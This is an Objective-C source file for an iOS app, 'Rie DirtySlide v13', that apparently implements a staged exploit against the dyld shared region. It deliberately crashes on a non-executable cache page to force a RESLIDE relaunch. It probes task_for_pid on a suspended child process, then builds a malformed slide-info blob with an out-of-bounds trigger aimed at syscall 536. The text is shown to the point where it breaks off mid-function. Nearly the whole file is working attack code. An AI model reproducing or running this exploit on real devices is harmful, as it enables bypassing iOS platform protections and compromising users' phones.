//
//  ViewController.m — Rie DirtySlide: DSC crash → RESLIDE relaunch → first-mapper
//
//  Technique:
//    1. Find NX (non-executable) page within dyld shared cache via VM region scan
//    2. Jump to NX page → crash with OS_REASON_FLAG_SHAREDREGION_FAULT (0x400)
//    3. runningboardd sets ReslideSharedCache → launchd relaunches app with RESLIDE
//    4. On relaunch: fresh empty shared region → first-mapper → syscall 536
//

#import "ViewController.h"
#import <dlfcn.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/vm_map.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <errno.h>
#import <fcntl.h>
#import <sys/mman.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <spawn.h>
#import <mach-o/loader.h>

// ── Rie types (same as reference exploit sr_cfg.h) ──
#ifndef _POSIX_SPAWN_RESLIDE
#define _POSIX_SPAWN_RESLIDE 0x0800
#endif
#ifndef POSIX_SPAWN_START_SUSPENDED
#define POSIX_SPAWN_START_SUSPENDED 0x0100
#endif
#ifndef F_ADDFILESIGS_RETURN
#define F_ADDFILESIGS_RETURN 97
#endif
#define RIE_SR_CFG_MAGIC 0x53524347u

typedef uint64_t              rie_mach_vm_address_t;
typedef uint64_t              rie_mach_vm_size_t;
typedef natural_t             rie_vm_region_info_t[24];
typedef void                 *rie_vm_region_recurse_info_t;

typedef kern_return_t (*Rie_VMRegionRecurseFn)(vm_map_t, rie_mach_vm_address_t *,
    rie_mach_vm_size_t *, natural_t *, rie_vm_region_recurse_info_t, mach_msg_type_number_t *);
typedef kern_return_t (*Rie_VMReadOverwriteFn)(vm_map_t, rie_mach_vm_address_t,
    rie_mach_vm_size_t, rie_mach_vm_address_t, rie_mach_vm_size_t *);

struct rie_sr_file {
    int      sf_fd;
    uint32_t sf_mappings_count;
    uint32_t sf_slide;
};

struct rie_sr_mapping {
    uint64_t sms_address;
    uint64_t sms_size;
    uint64_t sms_file_offset;
    uint64_t sms_slide_size;
    uint64_t sms_slide_start;
    uint32_t sms_max_prot;
    uint32_t sms_init_prot;
};

struct rie_sr_cfg {
    uint32_t magic;
    uint32_t _pad;
    uint64_t fault_addr;
    uint64_t blob_off;
    uint64_t blob_size;
    struct   rie_sr_file files[3];
    struct   rie_sr_mapping mappings[3];
};

typedef struct {
    void     *fs_blob_start;
    size_t    fs_blob_size;
    off_t     fs_file_start;
} rie_fsignatures_t;

// ── Interface ──
@interface ViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *crashButton;     // Stage 1: trigger DSC crash
@property (nonatomic, strong) UIButton *exploitButton;   // Stage 2: first-mapper exploit
@property (nonatomic, strong) UILabel  *statusLabel;
@property (nonatomic, assign) BOOL     isRelaunched;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    // Check if we're in the RESLIDE relaunch
    self.isRelaunched = [self checkRelaunchFlag];

    // Status label
    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 60)];
    self.statusLabel.textColor = [UIColor whiteColor];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 3;
    self.statusLabel.font = [UIFont boldSystemFontOfSize:16];
    if (self.isRelaunched) {
        self.statusLabel.text = @"⚠️ RELAUNCH DETECTED\nStage 2: First-Mapper Ready";
        self.statusLabel.textColor = [UIColor greenColor];
    } else {
        self.statusLabel.text = @"Stage 1: Trigger DSC Crash\n→ RESLIDE on next launch";
        self.statusLabel.textColor = [UIColor yellowColor];
    }
    [self.view addSubview:self.statusLabel];

    // Crash button (Stage 1)
    self.crashButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.crashButton.frame = CGRectMake(40, 140, self.view.bounds.size.width - 80, 60);
    self.crashButton.backgroundColor = [UIColor redColor];
    [self.crashButton setTitle:@"💀 Trigger DSC NX Crash" forState:UIControlStateNormal];
    [self.crashButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.crashButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    self.crashButton.layer.cornerRadius = 12;
    [self.crashButton addTarget:self action:@selector(triggerDSCCrash) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.crashButton];

    // Exploit button (Stage 2)
    self.exploitButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.exploitButton.frame = CGRectMake(40, 220, self.view.bounds.size.width - 80, 60);
    self.exploitButton.backgroundColor = self.isRelaunched ? [UIColor colorWithRed:0 green:0.6 blue:0 alpha:1] : [UIColor darkGrayColor];
    [self.exploitButton setTitle:@"⚡ First-Mapper Exploit (536)" forState:UIControlStateNormal];
    [self.exploitButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.exploitButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    self.exploitButton.layer.cornerRadius = 12;
    self.exploitButton.enabled = self.isRelaunched;
    [self.exploitButton addTarget:self action:@selector(runFirstMapper) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.exploitButton];

    // Log view
    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(10, 300, self.view.bounds.size.width - 20, self.view.bounds.size.height - 360)];
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1];
    self.logView.textColor = [UIColor greenColor];
    self.logView.font = [UIFont fontWithName:@"Courier" size:11];
    self.logView.editable = NO;
    [self.view addSubview:self.logView];

    [self log:@"=== Rie DirtySlide v13 ==="];
    [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
    [self log:@""];

    // Auto-detect: if relaunched, show info immediately
    if (self.isRelaunched) {
        [self log:@"!! RESLIDE relaunch detected — system gave us a fresh SR !!"];
        [self log:@"Tap 'First-Mapper Exploit' to call syscall 536."];
    } else {
        [self log:@"Tap 'Trigger DSC NX Crash' → app will crash → system will set"];
        [self log:@"ReslideSharedCache → relaunch app → first-mapper ready."];
    }

    // Immediate probe on relaunch
    if (self.isRelaunched) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC),
            dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            [self probeReslideState];
        });
    }
}

// ── Log helper ──
- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *line = [NSString stringWithFormat:@"%@\n", msg];
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

// ── Relaunch flag management ──
- (NSString *)flagPath {
    return [NSTemporaryDirectory() stringByAppendingPathComponent:@"rie_dsc.flag"];
}

- (BOOL)checkRelaunchFlag {
    return [[NSFileManager defaultManager] fileExistsAtPath:[self flagPath]];
}

- (void)setRelaunchFlag {
    NSString *path = [self flagPath];
    NSData *d = [@"1" dataUsingEncoding:NSUTF8StringEncoding];
    int fd = open([path UTF8String], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, d.bytes, d.length);
        fsync(fd);
        close(fd);
    }
    [self log:[NSString stringWithFormat:@"flag written: %@ (exists=%d)", path, [[NSFileManager defaultManager] fileExistsAtPath:path]]];
}

- (void)clearRelaunchFlag {
    [[NSFileManager defaultManager] removeItemAtPath:[self flagPath] error:nil];
}

// ── Stage 1: Find NX region in DSC and jump to it ──
- (uint64_t)findNXInDSC {
    Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
    if (!vrr) {
        [self log:@"!! mach_vm_region_recurse not available"];
        return 0;
    }

    // SR range from v240 logs: base=0x180000000 size=0x84000000
    uint64_t srBase = 0x180000000ULL;
    uint64_t srEnd  = srBase + 0x84000000ULL;

    rie_mach_vm_address_t addr = srBase;
    for (int i = 0; i < 100; i++) {
        rie_vm_region_info_t info;
        memset(info, 0, sizeof(info));
        rie_mach_vm_size_t size = 0;
        natural_t depth = 0;
        mach_msg_type_number_t cnt = sizeof(info) / sizeof(natural_t);

        kern_return_t kr = vrr(mach_task_self(), &addr, &size, &depth,
            (rie_vm_region_recurse_info_t)info, &cnt);
        if (kr != KERN_SUCCESS) break;
        if (addr >= srEnd) break;

        uint32_t prot = info[0];  // protection bits

        // Check: in SR range AND non-executable AND non-zero size
        if (addr >= srBase && size > 0 && !(prot & VM_PROT_EXECUTE)) {
            [self log:[NSString stringWithFormat:@"NX found: addr=0x%llx size=0x%llx prot=%u depth=%d",
                (unsigned long long)addr, (unsigned long long)size, prot, depth]];
            return (uint64_t)addr;
        }

        addr += size;
    }

    [self log:@"!! No NX region found in SR walk"];
    return 0;
}

- (void)triggerDSCCrash {
    [self log:@"\n── Stage 1: Finding NX region in DSC... ──"];
    [self setRelaunchFlag];

    // Find NX page
    uint64_t nxAddr = [self findNXInDSC];
    if (nxAddr == 0) {
        [self log:@"!! Cannot find NX region, aborting"];
        return;
    }

    [self log:[NSString stringWithFormat:@"Target NX: 0x%llx", (unsigned long long)nxAddr]];
    [self log:@"\n💀 JUMPING TO NX — APP WILL CRASH"];
    [self log:@"On next launch, system will RESLIDE this app."];
    [self log:@"Close this app and reopen it.\n"];

    // Flush log to console
    fflush(stdout);
    fflush(stderr);

    // Small delay to ensure flag is synced
    usleep(100000);  // 100ms

    // Jump to non-executable memory in DSC → instant crash
    // The kernel will set OS_REASON_FLAG_SHAREDREGION_FAULT
    typedef void (*nx_fn)(void);
    nx_fn fn = (nx_fn)(uintptr_t)nxAddr;
    fn();

    // Should never reach here
    [self log:@"!! Survived NX jump — something went wrong"];
}

// ── Stage 2: Probe RESLIDE state ──
- (void)probeReslideState {
    [self log:@"\n── Probing RESLIDE state... ──"];

    long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");

    // Check shared region
    uint64_t addr = 0;
    long r = sc(294, &addr);
    [self log:[NSString stringWithFormat:@"syscall(294,&addr): ret=%ld addr=0x%llx", r, (unsigned long long)addr]];

    // Probe syscall 536
    errno = 0;
    long r536 = sc(536, 0, 0, 0, 0);
    [self log:[NSString stringWithFormat:@"syscall(536,0,0,0,0): ret=%ld errno=%d", r536, errno]];

    // Scan VM regions around SR
    Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
    if (vrr) {
        rie_mach_vm_address_t w = 0x180000000ULL;
        for (int i = 0; i < 30; i++) {
            rie_vm_region_info_t info; memset(info, 0, sizeof(info));
            rie_mach_vm_size_t vs = 0; natural_t d = 0;
            mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
            if (vrr(mach_task_self(), &w, &vs, &d, (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
            if (w >= 0x210000000ULL) break;
            if (vs >= 0x1000 && d <= 2) {
                [self log:[NSString stringWithFormat:@"  VM[%d]: a=0x%llx sz=0x%llx prot=%u depth=%d",
                    i, (unsigned long long)w, (unsigned long long)vs, info[0], d]];
            }
            w += vs;
        }
    }

    // Test child spawn viability
    [self probeChildSpawn];

    // Quick DYLD env check (getenv only)
    [self log:@"\n── DYLD env check ──"];
    const char *dsr = getenv("DYLD_SHARED_REGION");
    const char *dsc = getenv("DYLD_SHARED_CACHE_DIR");
    [self log:[NSString stringWithFormat:@"DYLD_SHARED_REGION=%s", dsr ?: "(unset)"]];
    [self log:[NSString stringWithFormat:@"DYLD_SHARED_CACHE_DIR=%s", dsc ?: "(unset)"]];

    // Analyze dyld binary in shared cache
    [self probeDyldBinary];
}

// ── Probe: find dyld in shared cache, look for syscall 536 invocation ──
- (void)probeDyldBinary {
    [self log:@"\n── probeDyldBinary: locating dyld via dladdr... ──"];

    // dladdr on a dyld function returns dli_fbase = dyld Mach-O base in OUR process
    Dl_info info;
    if (!dladdr((void *)dlsym, &info) || !info.dli_fbase) {
        [self log:@"!! dladdr(dlsym) failed — cannot find dyld base"];
        return;
    }
    uint64_t dyldAddr = (uint64_t)(uintptr_t)info.dli_fbase;
    [self log:[NSString stringWithFormat:@"dyld base via dladdr(dlsym): 0x%llx", dyldAddr]];
    if (info.dli_fname) {
        [self log:[NSString stringWithFormat:@"dyld path: %s", info.dli_fname]];
    }

    // Read dyld Mach-O header directly (in our address space)
    struct mach_header_64 *mh = (struct mach_header_64 *)dyldAddr;
    if (mh->magic != MH_MAGIC_64) {
        [self log:[NSString stringWithFormat:@"!! bad magic at dyld base: 0x%x", mh->magic]];
        return;
    }
    [self log:[NSString stringWithFormat:@"dyld Mach-O: magic=0x%x cputype=%u ncmds=%u sizeofcmds=%u",
        mh->magic, mh->cputype, mh->ncmds, mh->sizeofcmds]];

    // Parse load commands to find __TEXT segment
    uint64_t textAddr = 0, textSize = 0;
    uint8_t *p = (uint8_t *)(dyldAddr + sizeof(struct mach_header_64));
    for (uint32_t ci = 0; ci < mh->ncmds; ci++) {
        struct load_command *lc = (struct load_command *)p;
        if (lc->cmdsize < 8) break;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)p;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                textAddr = seg->vmaddr;
                textSize = seg->vmsize;
                [self log:[NSString stringWithFormat:@"__TEXT: vmaddr=0x%llx vmsize=0x%llx fileoff=0x%llx",
                    textAddr, textSize, seg->fileoff]];
                break;
            }
        }
        p += lc->cmdsize;
    }

    if (textSize == 0 || textSize > 0x800000ULL) {
        [self log:[NSString stringWithFormat:@"!! bad __TEXT size: 0x%llx", textSize]];
        return;
    }

    // For shared cache dylib: __TEXT is at vmaddr (absolute address in shared region)
    // NOT at dyldAddr (which is a local Mach-O header copy created by dyld)
    uint64_t scanBase = textAddr; // 0x1800e6000 — actual __TEXT in shared region
    size_t scanLimit = (textSize < 0x40000) ? (size_t)textSize : 0x40000;

    [self log:[NSString stringWithFormat:@"Scanning __TEXT at vmaddr 0x%llx (first %zuKB) for SVC #0x80...",
        scanBase, scanLimit / 1024]];

    // Use mach_vm_read_overwrite to avoid SIGBUS on unmapped pages
    Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
    size_t chunk = 0x8000; // 32KB per read
    uint8_t *buf = (uint8_t *)malloc(chunk);
    if (!buf) { [self log:@"!! malloc"]; return; }

    size_t svcFound = 0;
    for (size_t scanOff = 0; scanOff < scanLimit && svcFound < 50; scanOff += chunk) {
        size_t thisChunk = ((scanLimit - scanOff) < chunk) ? (scanLimit - scanOff) : chunk;
        memset(buf, 0, thisChunk);
        rie_mach_vm_size_t got = 0;
        kern_return_t kr = vmr2(mach_task_self(), scanBase + scanOff, thisChunk,
            (rie_mach_vm_address_t)(uintptr_t)buf, &got);
        if (kr != KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"!! vmr(@0x%llx) failed: kr=%d(%s) — page not mapped",
                scanBase + scanOff, kr, mach_error_string(kr)]];
            break;
        }
        if (got < 4) break;

        for (size_t j = 0; j + 4 <= got && svcFound < 50; j += 4) {
            uint32_t insn = *(uint32_t *)(buf + j);
            if (insn == 0xD4000081) {
                uint64_t insnAddr = scanBase + scanOff + j;
                uint32_t prev = (j >= 4) ? *(uint32_t *)(buf + j - 4) : 0;
                uint16_t movzVal = 0;
                if ((prev & 0xFFE00000) == 0xD2800000) {
                    movzVal = (uint16_t)((prev >> 5) & 0xFFFF);
                }
                [self log:[NSString stringWithFormat:@"SVC[%zu] @0x%llx insn=0x%08x prev=0x%08x movz_x16=%u(0x%x)",
                    svcFound, (unsigned long long)insnAddr, insn, prev, movzVal, movzVal]];
                svcFound++;
            }
        }
    }
    free(buf);

    if (svcFound == 0) {
        [self log:@"!! No SVC #0x80 found in dyld __TEXT (first 256KB)"];
    } else {
        [self log:[NSString stringWithFormat:@"Found %zu SVC instructions in dyld __TEXT", svcFound]];
    }
}

// ── Probe: test posix_spawn(RESLIDE+SUSPENDED) + task_for_pid viability ──
- (void)probeChildSpawn {
    [self log:@"\n── Testing child spawn + task_for_pid... ──"];

    // Get our own binary path
    NSString *ownPath = [[NSBundle mainBundle] executablePath];
    [self log:[NSString stringWithFormat:@"self: %@", ownPath]];

    pid_t pid = -1;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Set flags: RESLIDE + START_SUSPENDED
    short flags = _POSIX_SPAWN_RESLIDE | POSIX_SPAWN_START_SUSPENDED;
    int rc = posix_spawnattr_setflags(&attr, flags);
    [self log:[NSString stringWithFormat:@"posix_spawnattr_setflags(0x%x): rc=%d", flags, rc]];

    if (rc != 0) {
        [self log:@"!! posix_spawnattr_setflags failed — flags not supported on iOS?"];
        posix_spawnattr_destroy(&attr);
        return;
    }

    char *args[] = { (char *)[ownPath UTF8String], "--rie-child", NULL };
    rc = posix_spawn(&pid, [ownPath UTF8String], NULL, &attr, args, NULL); // NULL env = inherit
    posix_spawnattr_destroy(&attr);

    if (rc != 0) {
        [self log:[NSString stringWithFormat:@"!! posix_spawn failed: %s (errno=%d)", strerror(rc), rc]];
        [self log:@"Child spawn not available — need alternative approach"];
        return;
    }

    [self log:[NSString stringWithFormat:@"spawned child pid=%d (SUSPENDED+RESLIDE)", pid]];

    // Try task_for_pid
    task_t childTask = TASK_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &childTask);
    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"!! task_for_pid(%d): %s (0x%x) — need get-task-allow", pid, mach_error_string(kr), kr]];
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
        return;
    }
    [self log:[NSString stringWithFormat:@"task_for_pid(%d): OK task=%d", pid, childTask]];

    // Try to get threads
    thread_act_array_t threads = NULL;
    mach_msg_type_number_t n = 0;
    kr = task_threads(childTask, &threads, &n);
    if (kr != KERN_SUCCESS || n < 1) {
        [self log:[NSString stringWithFormat:@"!! task_threads: %s n=%u", mach_error_string(kr), n]];
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
        return;
    }
    [self log:[NSString stringWithFormat:@"task_threads: OK n=%u", n]];

    // Get VM read func for child memory access
    Rie_VMReadOverwriteFn vmr_local = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
    Rie_VMRegionRecurseFn vrr2 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");

    // Try to read child's memory — try shared region start
    if (vmr_local) {
        uint8_t tbuf[4096];
        mach_vm_size_t got = 0;
        kr = vmr_local(childTask, 0x180000000ULL, 4096, (rie_mach_vm_address_t)(uintptr_t)tbuf, &got);
        if (kr == KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"mach_vm_read(child, 0x180000000): OK got=%llu", got]];
        } else {
            [self log:[NSString stringWithFormat:@"mach_vm_read(child, 0x180000000): %s (0x%x)",
                mach_error_string(kr), kr]];
        }
    }

    // Try to find child's exec base (find MH_EXECUTE)
    if (vrr2 && vmr_local) {
        rie_mach_vm_address_t caddr = 0;
        rie_mach_vm_size_t csize = 0;
        natural_t cdepth = 0;
        for (int ci = 0; ci < 20; ci++) {
            rie_vm_region_info_t cinfo; memset(cinfo, 0, sizeof(cinfo));
            mach_msg_type_number_t ccnt = sizeof(cinfo)/sizeof(natural_t);
            kr = vrr2(childTask, &caddr, &csize, &cdepth, (rie_vm_region_recurse_info_t)cinfo, &ccnt);
            if (kr != KERN_SUCCESS) break;
            if (csize < 0x1000) { caddr += csize; continue; }
            uint32_t chdr[4] = {0};
            mach_vm_size_t cgot = 0;
            if (vmr_local(childTask, caddr, sizeof(chdr),
                    (rie_mach_vm_address_t)(uintptr_t)chdr, &cgot) == KERN_SUCCESS &&
                cgot == sizeof(chdr) && chdr[0] == MH_MAGIC_64 && chdr[3] == MH_EXECUTE) {
                [self log:[NSString stringWithFormat:@"child exec base: 0x%llx", (unsigned long long)caddr]];
                break;
            }
            caddr += csize;
        }
    }

    // Cleanup: kill child
    kill(pid, SIGKILL);
    int status = 0;
    waitpid(pid, &status, 0);
    [self log:[NSString stringWithFormat:@"child cleaned up (exit=%d signal=%d)",
        WIFEXITED(status) ? WEXITSTATUS(status) : -1,
        WIFSIGNALED(status) ? WTERMSIG(status) : 0]];
    [self log:@"\n*** Child spawn + task_for_pid: VIABLE! Two-process model works! ***"];
}

// ── Stage 3: First-mapper exploit via syscall 536 (v8: child spawn probe) ──
- (void)runFirstMapper {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self log:@"\n── Stage 3: Rie v13 First-Mapper ──"];
        [self clearRelaunchFlag];

        long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");

        Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
        Rie_VMReadOverwriteFn  vmr = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
        if (!vrr || !vmr) { [self log:@"!! missing mach_vm_* APIs"]; return; }

        // ── Get shared region base from check_np ──
        uint64_t srBase = 0;
        long srCheck = sc(294, &srBase);
        [self log:[NSString stringWithFormat:@"check_np: ret=%ld base=0x%llx", srCheck, srBase]];
        if (srCheck != 0 || srBase == 0) {
            [self log:@"!! shared region not available"];
            return;
        }

        // ── Scan SR for dyld cache headers ──
        [self log:@"Scanning SR for dyld cache headers..."];
        uint64_t mainHdrAddr = 0, naHdrAddr = 0;
        // MWS[0] = header mapping
        uint64_t hdrAddr = 0, hdrSize = 0, hdrFoff = 0;
        uint32_t hdrMax = 0, hdrInit = 0;
        // Non-auth slide carrier
        uint64_t naAddr = 0, naSize = 0, naFoff = 0, naSlide = 0, naFlags = 0;
        uint32_t naMax = 0, naInit = 0;
        uint64_t csOff = 0, csSz = 0;
        int foundNA = -1;

        int subIdx = -1; // which sub-cache (0-indexed) has the non-auth slide
        rie_mach_vm_address_t walk = srBase;
        rie_mach_vm_address_t srEnd = srBase + 0x100000000ULL; // 4GB scan range
        for (int segIdx = 0; segIdx < 100; segIdx++) {
            rie_vm_region_info_t info; memset(info, 0, sizeof(info));
            rie_mach_vm_size_t segSize = 0; natural_t segDepth = 1;
            mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
            if (vrr(mach_task_self(), &walk, &segSize, &segDepth,
                (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
            if (walk >= srEnd) break;
            if (segSize < 4096) { walk += segSize; continue; }

            uint8_t *buf = (uint8_t *)malloc(4096);
            if (!buf) { walk += segSize; continue; }
            memset(buf, 0, 4096);
            rie_mach_vm_size_t outSz = 0;
            kern_return_t kr = vmr(mach_task_self(), walk, 4096,
                (rie_mach_vm_address_t)(uintptr_t)buf, &outSz);
            if (kr == KERN_SUCCESS && outSz >= 16 && memcmp(buf, "dyld_v1", 7) == 0) {
                if (segIdx == 0) mainHdrAddr = walk;
                int curSubIdx = segIdx - 1; // 0 = main, sub-caches start at index 0
                uint32_t mws_off = *(uint32_t*)(buf + 0x138);
                uint32_t mws_cnt = *(uint32_t*)(buf + 0x13c);
                if (segIdx > 0) {
                    [self log:[NSString stringWithFormat:@"dyld_v1[sub%d]: a=0x%llx mws=%u",
                        curSubIdx, (unsigned long long)walk, mws_cnt]];
                } else {
                    uint32_t sub_off = *(uint32_t*)(buf + 0x188);
                    uint32_t sub_cnt = *(uint32_t*)(buf + 0x18c);
                    [self log:[NSString stringWithFormat:@"dyld_v1[main]: a=0x%llx mws=%u sub=%u",
                        (unsigned long long)walk, mws_cnt, sub_cnt]];
                }

                uint8_t *fullHdr = (uint8_t *)malloc(0x10000);
                if (fullHdr) {
                    memset(fullHdr, 0, 0x10000);
                    rie_mach_vm_size_t fsz = 0;
                    if (vmr(mach_task_self(), walk, 0x10000,
                        (rie_mach_vm_address_t)(uintptr_t)fullHdr, &fsz) == KERN_SUCCESS) {
                        for (uint32_t mi = 0; mi < mws_cnt && mi < 10; mi++) {
                            const uint8_t *m = fullHdr + mws_off + mi * 56;
                            uint64_t a, sz, fo, sl, fl;
                            uint32_t mp, ip;
                            memcpy(&a, m+0, 8);  memcpy(&sz, m+8, 8);
                            memcpy(&fo, m+16, 8); memcpy(&sl, m+32, 8);
                            memcpy(&fl, m+40, 8); memcpy(&mp, m+48, 4); memcpy(&ip, m+52, 4);
                            BOOL isSlide = (sl != 0), isAuth = (fl & 1);
                            [self log:[NSString stringWithFormat:@"  MWS[%u]: a=0x%llx sz=0x%llx %@",
                                mi, a, sz, isSlide ? (isAuth ? @"AUTH" : @"<<< NONAUTH <<<") : @"NOSLIDE"]];
                            // Save MWS[0] as header mapping
                            if (mi == 0 && segIdx == 0) {
                                hdrAddr = a; hdrSize = sz; hdrFoff = fo;
                                hdrMax = mp; hdrInit = ip;
                            }
                            if (isSlide && !isAuth && foundNA < 0) {
                                foundNA = (int)mi;
                                naAddr = a; naSize = sz; naFoff = fo;
                                naSlide = sl; naFlags = fl;
                                naMax = mp; naInit = ip;
                                naHdrAddr = walk;
                                subIdx = curSubIdx;
                                csOff = *(uint64_t*)(fullHdr + 0x028);
                                csSz  = *(uint64_t*)(fullHdr + 0x030);
                            }
                        }
                    }
                    free(fullHdr);
                }
                if (foundNA >= 0) { free(buf); break; }
            }
            free(buf);
            walk += segSize;
        }

        if (foundNA < 0) {
            [self log:@"!! No non-auth slide carrier found in SR scan"];
            return;
        }
        if (hdrAddr == 0) {
            [self log:@"!! Header mapping (MWS[0]) not found"];
            return;
        }

        // Calculate blob_sr = first free page after header mapping
        uint64_t blob_sr = hdrAddr + hdrSize;
        [self log:[NSString stringWithFormat:@"\nHeader: a=0x%llx sz=0x%llx foff=0x%llx prot=%x/%x",
            hdrAddr, hdrSize, hdrFoff, hdrMax, hdrInit]];
        [self log:[NSString stringWithFormat:@"blob_sr: 0x%llx (header end)", blob_sr]];
        [self log:[NSString stringWithFormat:@"NONAUTH: a=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx prot=%x/%x",
            naAddr, naSize, naFoff, naSlide, naMax, naInit]];
        [self log:[NSString stringWithFormat:@"codeSig: 0x%llx+0x%llx", csOff, csSz]];

        // ── Build slide-info v5 blob ──
        #define V6_BLOB_PC 64
        size_t blobSz = 24 + V6_BLOB_PC * 2;
        uint8_t *blob = (uint8_t *)calloc(1, blobSz);
        if (!blob) { [self log:@"!! blob alloc failed"]; return; }
        {
            uint32_t v5 = 5, bps = 0x4000, bpc = V6_BLOB_PC;
            uint64_t va = 0; // value_add = 0 for now (probe)
            memcpy(blob, &v5, 4);
            memcpy(blob+4, &bps, 4);
            memcpy(blob+8, &bpc, 4);
            memcpy(blob+16, &va, 8);
            uint16_t *ps = (uint16_t*)(blob+24);
            for (uint32_t j = 0; j < V6_BLOB_PC; j++) ps[j] = 0xFFFF;
            ps[2] = 0xFFFE;  // OOB trigger at page index 2
            [self log:[NSString stringWithFormat:@"blob: v5 page_starts[2]=0xFFFE sz=%zu", blobSz]];
        }

        // ── Build sr_cfg in mmap'd buffer (page-aligned) ──
        size_t cfgSz = sizeof(struct rie_sr_cfg) + 0x4000;
        void *cfg = mmap(NULL, cfgSz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        if (cfg == MAP_FAILED) { [self log:@"!! cfg mmap failed"]; free(blob); return; }
        memset(cfg, 0, cfgSz);

        struct rie_sr_cfg *c = (struct rie_sr_cfg *)cfg;
        c->magic = RIE_SR_CFG_MAGIC;
        c->blob_off = 0x4000;
        c->fault_addr = naAddr;
        c->blob_size = blobSz;
        memcpy((uint8_t*)cfg + 0x4000, blob, blobSz);

        // ── Open dyld cache ──
        int fd_main = -1;
        const char *cacheDirs[] = {
            "/System/Library/dyld/",
            "/System/Library/Caches/com.apple.dyld/",
            "/System/Cryptexes/OS/System/Library/dyld/",
            "/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/",
            "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
        };
        const char *cacheName = "dyld_shared_cache_arm64e";
        int nDirs = sizeof(cacheDirs)/sizeof(cacheDirs[0]);

        for (int pi = 0; pi < nDirs && fd_main < 0; pi++) {
            char direct[1024];
            snprintf(direct, sizeof(direct), "%s%s", cacheDirs[pi], cacheName);
            NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:[NSString stringWithUTF8String:direct]];
            if (fh) {
                fd_main = dup((int)fh.fileDescriptor);
                [fh closeFile];
                [self log:[NSString stringWithFormat:@"cache OPEN: %s fd=%d", direct, fd_main]];
            }
        }

        if (fd_main < 0) {
            [self log:@"!! Cannot open dyld cache — no fd"];
            free(blob); munmap(cfg, cfgSz); return;
        }

        // ── F_ADDFILESIGS on main cache ──
        {
            uint8_t hb[0x40]; pread(fd_main, hb, 0x40, 0);
            uint64_t co = *(uint64_t*)(hb+0x28), csz = *(uint64_t*)(hb+0x30);
            rie_fsignatures_t fs; memset(&fs, 0, sizeof(fs));
            fs.fs_file_start = (off_t)co;
            fs.fs_blob_start = NULL;
            fs.fs_blob_size  = (size_t)csz;
            int rc = fcntl(fd_main, F_ADDFILESIGS_RETURN, &fs);
            [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(main) rc=%d cs=0x%llx+0x%llx", rc, co, csz]];
        }

        // ── Determine slide carrier fd ──
        int fd_sub = fd_main;
        if (naHdrAddr != mainHdrAddr && subIdx >= 0) {
            [self log:[NSString stringWithFormat:@"Non-auth slide in sub-cache #%d (hdr=0x%llx)",
                subIdx, naHdrAddr]];
            // Read main cache header to get subCacheArray entry for this sub-cache
